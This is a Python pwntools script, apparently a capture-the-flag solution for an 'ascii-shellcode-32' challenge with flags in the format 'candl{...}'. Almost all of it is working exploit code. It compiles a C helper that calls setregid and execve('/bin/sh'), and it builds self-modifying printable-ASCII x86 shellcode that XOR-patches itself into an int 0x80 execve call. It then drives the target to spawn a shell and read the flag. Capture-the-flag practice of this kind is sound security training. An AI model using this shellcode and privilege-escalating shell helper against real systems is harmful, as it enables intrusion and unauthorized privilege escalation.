from pwn import *
import os

c_code = '''
#include <unistd.h>
int main() {
    setregid(getegid(), getegid());
    execve("/bin/sh", 0, 0);
}
'''

with open("payload.c", "w") as f:
    f.write(c_code)

os.system("gcc -o z payload.c")


shellcode = asm('''
push   eax
pop    edx # store eax in edx

push   0x31 # zero eax
pop    eax
xor    al, 0x31
dec    eax # gets us ff

xor [edx + 0x1e], al
xor [edx + 0x1f], al

push 0x7a
push esp
pop  ebx

push 0x31
pop  eax
xor  al, 0x31
push eax
push eax
pop  ecx
pop  edx

push 0xb
pop  eax

.dc.b 0x32, 0x7f # these ^ ff = int 0x80
''')

print(disasm(shellcode))

with open('shellcode.bin', 'wb') as f:
    f.write(shellcode)

io = process("ascii-shellcode-32", env={"PATH":"$PATH:."})


import re
io.sendlineafter(b'Reading', b'cat flag')
flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
print(flag)

